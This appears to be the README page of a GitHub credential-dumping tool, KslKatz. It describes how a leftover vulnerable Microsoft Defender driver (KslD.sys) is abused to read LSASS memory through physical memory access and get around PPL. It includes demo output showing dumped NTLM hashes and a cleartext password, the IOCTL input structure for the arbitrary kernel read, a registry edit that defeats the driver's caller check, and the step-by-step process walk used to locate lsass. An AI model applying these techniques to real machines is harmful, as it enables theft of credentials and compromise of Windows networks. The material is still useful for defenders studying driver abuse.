+<ul dir="auto">
+<li><a href="https://github.com/k3nundrum/KslKatz#eprocess-discovery">EPROCESS Discovery</a></li>
+<li><a href="https://github.com/k3nundrum/KslKatz#physical-memory-read-and-ppl-bypass">Physical Memory Read and PPL Bypass</a></li>
+<li><a href="https://github.com/k3nundrum/KslKatz#lsa-key-extraction">LSA Key Extraction</a></li>
+<li><a href="https://github.com/k3nundrum/KslKatz#msv1_0-credential-extraction">MSV1_0 Credential Extraction</a></li>
+<li><a href="https://github.com/k3nundrum/KslKatz#wdigest-cleartext-extraction">WDigest Cleartext Extraction</a></li>
+</ul>
+</li>
+<li><a href="https://github.com/k3nundrum/KslKatz#attack-chain">Attack Chain</a></li>
+<li><a href="https://github.com/k3nundrum/KslKatz#embedded-driver">Embedded Driver</a></li>
+<li><a href="https://github.com/k3nundrum/KslKatz#comparison-with-other-tools">Comparison with Other Tools</a></li>
+<li><a href="https://github.com/k3nundrum/KslKatz#supported-windows-versions">Supported Windows Versions</a></li>
+<li><a href="https://github.com/k3nundrum/KslKatz#building">Building</a></li>
+<li><a href="https://github.com/k3nundrum/KslKatz#project-structure">Project Structure</a></li>
+<li><a href="https://github.com/k3nundrum/KslKatz#credits">Credits</a></li>
+<li><a href="https://github.com/k3nundrum/KslKatz#responsible-disclosure">Responsible Disclosure</a></li>
+<li><a href="https://github.com/k3nundrum/KslKatz#disclaimer">Disclaimer</a></li>
+</ul>
+<hr>
+<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Overview</h2><a id="user-content-overview" class="anchor" aria-label="Permalink: Overview" href="https://github.com/k3nundrum/KslKatz#overview"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">KslKatz combines two proven techniques into a single standalone executable:</p>
+<ol dir="auto">
+<li><strong>KslD.sys BYOVD</strong> for kernel/physical memory access, bypassing PPL protection on LSASS</li>
+<li><strong>GhostKatz-style local signature scanning</strong> for resolving lsasrv.dll and wdigest.dll internals without expensive remote memory scans</li>
+</ol>
+<p dir="auto">The result is a tool that reads LSASS credentials through physical memory using only a Microsoft-signed driver that is already present on disk, requires no internet access, no additional files, and cleans up after itself.</p>
+<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">What Gets Extracted</h3><a id="user-content-what-gets-extracted" class="anchor" aria-label="Permalink: What Gets Extracted" href="https://github.com/k3nundrum/KslKatz#what-gets-extracted"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<markdown-accessiblity-table data-catalyst=""><table>
+<thead>
+<tr>
+<th>Package</th>
+<th>Data</th>
+<th>Condition</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>MSV1_0</strong></td>
+<td>NT Hash, LM Hash, SHA1 Hash per logon session</td>
+<td>Always available after interactive logon</td>
+</tr>
+<tr>
+<td><strong>WDigest</strong></td>
+<td>Cleartext password (UTF-16)</td>
+<td>Requires WDigest caching enabled (registry, GPO, or in-memory patch)</td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<hr>
+<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Demo Output</h2><a id="user-content-demo-output" class="anchor" aria-label="Permalink: Demo Output" href="https://github.com/k3nundrum/KslKatz#demo-output"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<div class="snippet-clipboard-content notranslate position-relative overflow-auto"><pre class="notranslate"><code>C:\&gt; KslKatz.exe
+[*] Windows Build 20348
+[*] Setting up KslD driver...
+  Deploying embedded driver to vKslD.sys...
+  Driver deployed and verified
+[+] Driver loaded
+[*] KASLR bypass (SubCmd 2)...
+  idtr=0xfffff8000b6cb000 cr3=0x6d5000
+  ntoskrnl=0xfffff8000bc1f000
+[*] Finding lsass.exe...
+  Handle to SYSTEM (PID 4), our PID=5452, handle=0x124
+  Handle table: 35540 entries
+  SYSTEM EPROCESS=0xffffe60d6e099040
+  Offsets: PID=0x440 Links=0x448 Name=0x5a8
+[*] Walk ActiveProcessLinks from SYSTEM to find lsass.exe
+  lsass.exe PID=724 DTB=0x1269e000
+  PEB=0x3ab715f000 LDR=0x7ffb7e033140
+[*] Finding lsasrv.dll...
+  lsasrv.dll base=0x7ffb7ae80000 size=0x190000
+[*] Extracting LSA encryption keys...
+  LSA keys found
+[*] Finding LogonSessionList...
+[*] Extracting MSV1_0 credentials...
+[*] Checking WDigest...
+[*] Finding wdigest.dll in lsass...
+  wdigest.dll base=0x7ffb7a3e0000 size=0x51000
+  l_LogSessList at 0x7ffb7a42a5c8 (RVA=0x4a5c8)
+[*] Restoring driver configuration...
+  Removed deployed vKslD.sys
+======================================================================
+ MSV1_0 CREDENTIALS
+======================================================================
+[+] 2 credential(s):
+
+  YOURDOM\admin
+    NT:   aad3b435b51404eeaad3b435b51404ee
+
+  YOURDOM\svc_backup
+    NT:   31d6cfe0d16ae931b73c59d7e0c089c0
+
+======================================================================
+ WDIGEST CREDENTIALS (Cleartext)
+======================================================================
+[+] 1 credential(s):
+
+  YOURDOM\admin
+    Password: Summer2025!
+
+======================================================================
+[*] Total: 2 MSV1_0, 1 WDigest
+</code></pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="C:\> KslKatz.exe
+[*] Windows Build 20348
+[*] Setting up KslD driver...
+  Deploying embedded driver to vKslD.sys...
+  Driver deployed and verified
+[+] Driver loaded
+[*] KASLR bypass (SubCmd 2)...
+  idtr=0xfffff8000b6cb000 cr3=0x6d5000
+  ntoskrnl=0xfffff8000bc1f000
+[*] Finding lsass.exe...
+  Handle to SYSTEM (PID 4), our PID=5452, handle=0x124
+  Handle table: 35540 entries
+  SYSTEM EPROCESS=0xffffe60d6e099040
+  Offsets: PID=0x440 Links=0x448 Name=0x5a8
+[*] Walk ActiveProcessLinks from SYSTEM to find lsass.exe
+  lsass.exe PID=724 DTB=0x1269e000
+  PEB=0x3ab715f000 LDR=0x7ffb7e033140
+[*] Finding lsasrv.dll...
+  lsasrv.dll base=0x7ffb7ae80000 size=0x190000
+[*] Extracting LSA encryption keys...
+  LSA keys found
+[*] Finding LogonSessionList...
+[*] Extracting MSV1_0 credentials...
+[*] Checking WDigest...
+[*] Finding wdigest.dll in lsass...
+  wdigest.dll base=0x7ffb7a3e0000 size=0x51000
+  l_LogSessList at 0x7ffb7a42a5c8 (RVA=0x4a5c8)
+[*] Restoring driver configuration...
+  Removed deployed vKslD.sys
+======================================================================
+ MSV1_0 CREDENTIALS
+======================================================================
+[+] 2 credential(s):
+
+  YOURDOM\admin
+    NT:   aad3b435b51404eeaad3b435b51404ee
+
+  YOURDOM\svc_backup
+    NT:   31d6cfe0d16ae931b73c59d7e0c089c0
+
+======================================================================
+ WDIGEST CREDENTIALS (Cleartext)
+======================================================================
+[+] 1 credential(s):
+
+  YOURDOM\admin
+    Password: Summer2025!
+
+======================================================================
+[*] Total: 2 MSV1_0, 1 WDigest" tabindex="0" role="button">
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<hr>
+<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">The Vulnerability</h2><a id="user-content-the-vulnerability" class="anchor" aria-label="Permalink: The Vulnerability" href="https://github.com/k3nundrum/KslKatz#the-vulnerability"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">KslD.sys is a kernel driver shipped as part of Microsoft Defender. It is Microsoft-signed, loaded as a trusted kernel module, and exposes a device object <code>\\.\KslD</code> accessible from usermode via <code>CreateFileW</code>.</p>
+<p dir="auto">Microsoft ships two versions of this driver side by side:</p>
+<markdown-accessiblity-table data-catalyst=""><table>
+<thead>
+<tr>
+<th>Version</th>
+<th>Size</th>
+<th>Location</th>
+<th>MmCopyMemory</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Patched</td>
+<td>~82 KB</td>
+<td><code>drivers\wd\KslD.sys</code></td>
+<td>Nulled out</td>
+<td>Active (ImagePath points here)</td>
+</tr>
+<tr>
+<td>Vulnerable</td>
+<td>~333 KB</td>
+<td><code>drivers\KslD.sys</code></td>
+<td>Functional</td>
+<td><strong>Sitting on disk, never removed</strong></td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<p dir="auto">The patched version deliberately clears the <code>MmCopyMemory</code> function pointer during initialization, disabling SubCmd 12. The vulnerable version stores it. Both binaries are Microsoft-signed and trusted by the OS. Defender platform updates drop the patched version into the <code>wd\</code> subdirectory and update <code>ImagePath</code>, but the old vulnerable version is never deleted from the <code>drivers\</code> directory.</p>
+<p dir="auto">KslKatz simply switches <code>ImagePath</code> back to the vulnerable version via <code>ChangeServiceConfigW</code> and restarts the service.</p>
+<details>
+<summary><b>Why the old driver is still on disk</b></summary>
+<p dir="auto">Microsoft's public documentation shows that KB4052623 delivers Defender platform updates, including a historical move of Defender drivers to <code>System32\drivers\wd\</code>. Windows servicing keeps WinSxS-backed component-store files via NTFS hard links and only removes superseded component versions during cleanup. On tested systems, this explains why the newer 82 KB KslD.sys arrives through the Defender platform-update path while the older 333 KB <code>System32\drivers\KslD.sys</code> remains as the current CBS-backed component-store copy until explicitly superseded by a newer CBS version.</p>
+</details>
+<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">The Read Primitive</h3><a id="user-content-the-read-primitive" class="anchor" aria-label="Permalink: The Read Primitive" href="https://github.com/k3nundrum/KslKatz#the-read-primitive"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">The core of the vulnerability is SubCmd 12, an unrestricted <code>MmCopyMemory()</code> wrapper exposed to usermode:</p>
+<div class="highlight highlight-source-c notranslate position-relative overflow-auto" dir="auto"><pre><span class="pl-c">// IOCTL 0x222044, SubCmd 12</span>
+<span class="pl-k">struct</span> <span class="pl-smi">IoReadInput</span> {
+    <span class="pl-smi">DWORD</span>  <span class="pl-c1">SubCmd</span>;       <span class="pl-c">// 12</span>
+    <span class="pl-smi">DWORD</span>  <span class="pl-c1">Reserved</span>;     <span class="pl-c">// 0</span>
+    <span class="pl-smi">QWORD</span>  <span class="pl-c1">Address</span>;      <span class="pl-c">// Target virtual or physical address</span>
+    <span class="pl-smi">QWORD</span>  <span class="pl-c1">Size</span>;         <span class="pl-c">// Number of bytes to read</span>
+    <span class="pl-smi">DWORD</span>  <span class="pl-c1">Flags</span>;        <span class="pl-c">// 1 = Physical, 2 = Virtual</span>
+    <span class="pl-smi">DWORD</span>  <span class="pl-c1">Padding</span>;
+};
+<span class="pl-c">// Output: raw memory contents, up to Size bytes</span></pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="// IOCTL 0x222044, SubCmd 12
+struct IoReadInput {
+    DWORD  SubCmd;       // 12
+    DWORD  Reserved;     // 0
+    QWORD  Address;      // Target virtual or physical address
+    QWORD  Size;         // Number of bytes to read
+    DWORD  Flags;        // 1 = Physical, 2 = Virtual
+    DWORD  Padding;
+};
+// Output: raw memory contents, up to Size bytes" tabindex="0" role="button">
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<markdown-accessiblity-table data-catalyst=""><table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Mode</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><strong>Physical</strong></td>
+<td>Reads any physical address via <code>MmCopyMemory</code>. Not subject to PPL, EPROCESS protection, or any usermode API restriction. This is the PPL bypass primitive.</td>
+</tr>
+<tr>
+<td>2</td>
+<td><strong>Virtual</strong></td>
+<td>Reads kernel virtual addresses directly. Used for walking kernel structures (EPROCESS, IDT, ntoskrnl) without manual page table translation.</td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<p dir="auto">SubCmd 2 provides additional information leaks:</p>
+<div class="highlight highlight-source-c notranslate position-relative overflow-auto" dir="auto"><pre><span class="pl-c">// IOCTL 0x222044, SubCmd 2</span>
+<span class="pl-c">// Returns CPU register name/value pairs (8 bytes name + 8 bytes value each)</span>
+<span class="pl-c">// Key registers: CR3 (current DTB), IDTR (IDT base), CR0, CR4</span></pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="// IOCTL 0x222044, SubCmd 2
+// Returns CPU register name/value pairs (8 bytes name + 8 bytes value each)
+// Key registers: CR3 (current DTB), IDTR (IDT base), CR0, CR4" tabindex="0" role="button">
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<p dir="auto">The combination of SubCmd 2 (KASLR defeat) and SubCmd 12 (arbitrary read) provides a complete kernel memory introspection capability from usermode.</p>
+<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">The Access Control</h3><a id="user-content-the-access-control" class="anchor" aria-label="Permalink: The Access Control" href="https://github.com/k3nundrum/KslKatz#the-access-control"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">The driver validates the calling process by comparing its image path against the <code>AllowedProcessName</code> registry value stored under <code>HKLM\SYSTEM\CurrentControlSet\Services\KslD</code>. This value contains a full NT device path like <code>\Device\HarddiskVolume3\ProgramData\Microsoft\Windows Defender\Platform\4.18.x\MsMpEng.exe</code>.</p>
+<p dir="auto">This check is trivially bypassed because the registry value is:</p>
+<ul dir="auto">
+<li>Editable by any local administrator</li>
+<li>Not protected by Defender's tamper protection mechanisms</li>
+<li>Not validated against code signing, binary integrity, or any cryptographic property</li>
+<li>A plain string comparison with no additional verification</li>
+</ul>
+<p dir="auto">KslKatz writes its own NT device path to <code>AllowedProcessName</code>, restarts the service, and opens the device handle.</p>
+<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">The Blocklist Paradox</h3><a id="user-content-the-blocklist-paradox" class="anchor" aria-label="Permalink: The Blocklist Paradox" href="https://github.com/k3nundrum/KslKatz#the-blocklist-paradox"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">Microsoft maintains a <a href="https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/microsoft-recommended-driver-block-rules" rel="nofollow">Vulnerable Driver Blocklist</a> (<code>DriverSiPolicy.p7b</code>) enforced via HVCI to prevent BYOVD attacks. From their documentation:</p>
+<blockquote>
+<p dir="auto"><em>"The vulnerable driver blocklist is designed to help harden systems against <strong>non-Microsoft-developed drivers</strong> across the Windows ecosystem."</em></p>
+</blockquote>
+<p dir="auto"><strong>Microsoft's own drivers are excluded from the blocklist by design.</strong></p>
+<hr>
+<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Architecture</h2><a id="user-content-architecture" class="anchor" aria-label="Permalink: Architecture" href="https://github.com/k3nundrum/KslKatz#architecture"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">EPROCESS Discovery</h3><a id="user-content-eprocess-discovery" class="anchor" aria-label="Permalink: EPROCESS Discovery" href="https://github.com/k3nundrum/KslKatz#eprocess-discovery"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">KslKatz needs to find the <code>lsass.exe</code> EPROCESS structure in kernel memory to obtain its Directory Table Base (DTB/CR3) for page table walks. The approach uses the <code>SystemHandleInformation</code> API to leak a kernel object pointer:</p>
+<div class="snippet-clipboard-content notranslate position-relative overflow-auto"><pre class="notranslate"><code>1. OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, PID=4)
+   -&gt; Obtains a handle to the SYSTEM process
+
+2. RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE)
+   -&gt; Required for Object pointers in handle table results
+
+3. NtQuerySystemInformation(SystemHandleInformation)
+   -&gt; Returns all open handles in the system with their Object pointers
+   -&gt; Find our handle by matching (our PID, our handle value)
+   -&gt; Object field = kernel address of SYSTEM EPROCESS
+
+4. Read SYSTEM EPROCESS via SubCmd 12 (virtual read, 0x800 bytes)
+   -&gt; Scan for PID=4 followed by a kernel pointer -&gt; UniqueProcessId + ActiveProcessLinks offsets
+   -&gt; Scan for "System\0" string -&gt; ImageFileName offset
+   -&gt; All offsets detected dynamically, no hardcoded values per build
+
+5. Walk ActiveProcessLinks doubly-linked list
+   -&gt; Read ImageFileName at each EPROCESS
+   -&gt; Match "lsass.exe" -&gt; extract DTB from EPROCESS+0x28
+   -&gt; Auto-detect PEB offset by scanning for valid usermode pointer with PEB/LDR structure
+</code></pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="1. OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, PID=4)
+   -> Obtains a handle to the SYSTEM process
+
+2. RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE)
+   -> Required for Object pointers in handle table results
+
+3. NtQuerySystemInformation(SystemHandleInformation)
+   -> Returns all open handles in the system with their Object pointers
+   -> Find our handle by matching (our PID, our handle value)
+   -> Object field = kernel address of SYSTEM EPROCESS
+
+4. Read SYSTEM EPROCESS via SubCmd 12 (virtual read, 0x800 bytes)
+   -> Scan for PID=4 followed by a kernel pointer -> UniqueProcessId + ActiveProcessLinks offsets
+   -> Scan for &quot;System\0&quot; string -> ImageFileName offset
